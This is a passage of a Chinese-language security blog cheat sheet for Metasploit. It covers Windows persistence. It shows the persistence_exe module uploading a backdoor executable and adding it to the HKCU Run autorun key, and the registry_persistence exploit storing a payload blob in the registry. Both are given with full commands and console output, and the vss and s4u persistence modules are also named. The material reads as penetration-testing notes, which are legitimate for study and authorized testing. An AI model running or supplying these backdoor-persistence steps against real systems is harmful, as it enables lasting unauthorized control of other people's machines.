+   STARTUP   USER             yes       Startup <span class="hljs-built_in">type</span> <span class="hljs-keyword">for</span> the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数</p><ul><li>REXENAME是拷贝到目标系统中的名字</li><li>EXEPATH是将要上传的后门在本地的位置</li><li>SESSION是选择运行此模块的会话</li><li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li></ul><p>尝试一下：</p><pre style="position: relative;"><code class="lang-bash hljs">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER
+
+[*] Running module against SAUCERMAN
+[*] Reading Payload from file /home/ubuntu/shell.exe
+[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe
+[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe
+[+] Agent executed with PID 3684
+[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI
+[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI
+[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>4.registry_persistence</p><p>完整路径为exploit/windows/local/registry_persistence</p><p>和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。</p><pre style="position: relative;"><code class="lang-bash hljs">meterpreter &gt; background
+[*] Backgrounding session 13...
+msf5 auxiliary(server/socks5) &gt; use exploit/windows/<span class="hljs-built_in">local</span>/registry_persistence
+msf5 exploit(windows/<span class="hljs-built_in">local</span>/registry_persistence) &gt; show options
+
+Module options (exploit/windows/<span class="hljs-built_in">local</span>/registry_persistence):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   BLOB_REG_KEY                    no        The registry key to use <span class="hljs-keyword">for</span> storing the payload blob. (Default: random)
+   BLOB_REG_NAME                   no        The name to use <span class="hljs-keyword">for</span> storing the payload blob. (Default: random)
+   CREATE_RC      <span class="hljs-literal">true</span>             no        Create a resource file <span class="hljs-keyword">for</span> cleanup
+   RUN_NAME                        no        The name to use <span class="hljs-keyword">for</span> the <span class="hljs-string">'Run'</span> key. (Default: random)
+   SESSION                         yes       The session to run this module on.
+   SLEEP_TIME     0                no        Amount of time to sleep (<span class="hljs-keyword">in</span> seconds) before executing payload. (Default: 0)
+   STARTUP        USER             yes       Startup <span class="hljs-built_in">type</span> <span class="hljs-keyword">for</span> the persistent payload. (Accepted: USER, SYSTEM)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(windows/<span class="hljs-built_in">local</span>/registry_persistence) &gt; <span class="hljs-built_in">set</span> SESSION 13
+SESSION =&gt; 13
+msf5 exploit(windows/<span class="hljs-built_in">local</span>/registry_persistence) &gt; run
+
+[*] Generating payload blob..
+[+] Generated payload, 6048 bytes
+[*] Root path is HKCU
+[*] Installing payload blob..
+[+] Created registry key HKCU\Software\0BaG3zDR
+[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD
+[*] Installing run key
+[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB
+[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。</p><h2><a name="cl-13"></a>参考</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">https://www.freebuf.com/sectool/118714.html</a></li></ul> 
+</div>
+</article>
+<link rel="stylesheet" href="./msf备忘录 - SAUCERMAN_files/comments.css">
+<div class="blog-post-comments v" id="comments">
+<div class="blog-post-comments v" id="respond-post-79">
+<form method="post" action="https://saucer-man.com/information_security/79.html/comment" id="comment-form">
+<div class="vwrap">
+<div class="vheader item3">
+<input name="author" placeholder="昵称" class="vnick vinput" type="text" value="" required=""><input name="mail" placeholder="邮箱" class="vmail vinput" type="email" value="" required=""><input name="url" placeholder="网址(http://)" class="vlink vinput" type="url" value="">
+</div>
+<div class="vedit">
+<textarea name="text" id="veditor" class="OwO-textarea veditor vinput" onkeydown="if(event.ctrlKey&amp;&amp;event.keyCode==13){document.getElementById(&#39;misubmit&#39;).click();return false};" placeholder="说点什么?"></textarea>
+<div class="vrow">
+<div class="vcol vcol-60 status-bar"></div>
+<div class="vcol vcol-40 vctrl text-right">
+<div title="表情" class="OwO"></div>
+</div>
+</div>
+</div>
+<div class="vcontrol">
+<div class="col col-20" title="Markdown is supported">
+<a href="https://segmentfault.com/markdown" target="_blank"><svg class="markdown" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true">
+<path fill-rule="evenodd" d="M14.85 3H1.15C.52 3 0 3.52 0 4.15v7.69C0 12.48.52 13 1.15 13h13.69c.64 0 1.15-.52 1.15-1.15v-7.7C16 3.52 15.48 3 14.85 3zM9 11H7V8L5.5 9.92 4 8v3H2V5h2l1.5 2L7 5h2v6zm2.99.5L9.5 8H11V5h2v3h1.5l-2.51 3.5z">
+</path>
+</svg></a>
+</div>
+<div class="col col-80 text-right">
+1 + 1 = <input type="text" name="sum" class="vnick vinput" value="" size="25" tabindex="4" style=" width:70px;" placeholder="计算结果">
+<input type="hidden" name="num1" value="1">
+<input type="hidden" name="num2" value="1"> <button type="submit" title="Cmd|Ctrl+Enter" class="vsubmit vbtn" id="misubmit">回复</button>
+</div>
+</div>
+<div style="display:none;" class="vmark">
+</div>
+</div>
+<input type="hidden" name="_" value="05965e689379b8dfb3f2853bc0d79c8c"></form>
+</div>
+<div class="vempty" style="display:block;">快来做第一个评论的人吧~</div>
+<div class="vlist">
+</div>
+</div>
+<script type="text/javascript">function showhidediv(id) {var sbtitle =document.getElementById(id);if (sbtitle) {if (sbtitle.style.display =='flex') {sbtitle.style.display ='none';} else {sbtitle.style.display ='flex';} } }
+(function () {window.TypechoComment ={dom:function (id) {return document.getElementById(id) },pom:function (id) {return document.getElementsByClassName(id)[0] },iom:function (id,dis) {var alist =document.getElementsByClassName(id);if (alist) {for (var idx =0;idx < alist.length;idx++) {var mya =alist[idx];mya.style.display =dis } } },create:function (tag,attr) {var el =document.createElement(tag);for (var key in attr) {el.setAttribute(key,attr[key]) } return el },reply:function (cid,coid) {var comment =this.dom(cid),parent =comment.parentNode,response =this.dom("respond-post-79"),input =this.dom("comment-parent"),form ="form" ==response.tagName ?response :response.getElementsByTagName("form")[0],textarea =response.getElementsByTagName("textarea")[0];if (null ==input) {input =this.create("input",{"type":"hidden","name":"parent","id":"comment-parent" });form.appendChild(input) } input.setAttribute("value",coid);if (null ==this.dom("comment-form-place-holder")) {var holder =this.create("div",{"id":"comment-form-place-holder" });response.parentNode.insertBefore(holder,response) } comment.appendChild(response);this.iom("comment-reply","");this.pom("cp-" + cid).style.display ="none";this.iom("cancel-comment-reply","none");this.pom("cl-" + cid).style.display ="";if (null !=textarea &&"text" ==textarea.name) {textarea.focus() } return false },cancelReply:function () {var response =this.dom("respond-post-79"),holder =this.dom("comment-form-place-holder"),input =this.dom("comment-parent");if (null !=input) {input.parentNode.removeChild(input) } if (null ==holder) {return true } this.iom("comment-reply","");this.iom("cancel-comment-reply","none");holder.parentNode.insertBefore(response,holder);return false } } })();</script>
+</section>
+</div>
+<footer id="footer" style="display:block;">
+<div class="footer-left">
+Copyright © 2023 By <a href="https://www.typecho.org/" target="_blank" rel="nofollow">Typecho</a> &amp; <a href="https://saucer-man.com/">saucerman</a>
+</div>
+<div class="footer-right">
+<nav>
+<ul>
+<li>
+<a href="https://saucer-man.com/">Home</a>
+</li>
+<li><a href="https://saucer-man.com/archives.html">Archives</a></li><li><a href="https://saucer-man.com/about.html">About</a></li> <li>
+<a href="https://github.com/saucer-man" target="_blank">Github</a>
+</li> </ul>
+</nav>
+</div>
+</footer>
+<link rel="stylesheet" href="./msf备忘录 - SAUCERMAN_files/font-awesome.min.css">
+<script src="./msf备忘录 - SAUCERMAN_files/main.js"></script>
+<link rel="stylesheet" href="./msf备忘录 - SAUCERMAN_files/lightbox.min.css">
+<script src="./msf备忘录 - SAUCERMAN_files/lightbox.min.js"></script>
+<script src="./msf备忘录 - SAUCERMAN_files/highlight.min.js"></script>
+<script>$('#post-content img').wrap(function () {return '<a href="' + this.src + '" title="' + this.alt + '" data-lightbox="roadtrip"></a>';});</script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script>if ('serviceWorker'in navigator) {window.addEventListener('load',()=>{navigator.serviceWorker.register('https://saucer-man.com/usr/themes/cactus/sw.js').then(registration=>{console.log('SW registered: ',registration);}
+).catch(registrationError=>{console.log('SW registration failed: ',registrationError);}
+);}
+);}
+</script>
+<script type="text/javascript" src="./msf备忘录 - SAUCERMAN_files/codecopy.js"></script> 
+
+<div id="lightboxOverlay" class="lightboxOverlay" style="display: none;"></div><div id="lightbox" class="lightbox" style="display: none;"><div class="lb-outerContainer"><div class="lb-container"><img class="lb-image" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="><div class="lb-nav"><a class="lb-prev" href="https://saucer-man.com/information_security/79.html"></a><a class="lb-next" href="https://saucer-man.com/information_security/79.html"></a></div><div class="lb-loader"><a class="lb-cancel"></a></div></div></div><div class="lb-dataContainer"><div class="lb-data"><div class="lb-details"><span class="lb-caption"></span><span class="lb-number"></span></div><div class="lb-closeContainer"><a class="lb-close"></a></div></div></div></div><bookmark-sidebar-2ust6wf3jkg id="redeviation-bs-sidebar" class="notranslate" aria-hidden="true" data-theme="default" data-pos="left"><template shadowrootmode="closed"><iframe style="margin:0;padding: 0;border: none;width: 100%;height: 100%;"></iframe></template></bookmark-sidebar-2ust6wf3jkg><div id="redeviation-bs-indicator" data-theme="default" class="redeviation-bs-fullHeight redeviation-bs-visible" data-pos="left" style="height: 100%; top: 0%;"><div><span></span></div></div></body></html>
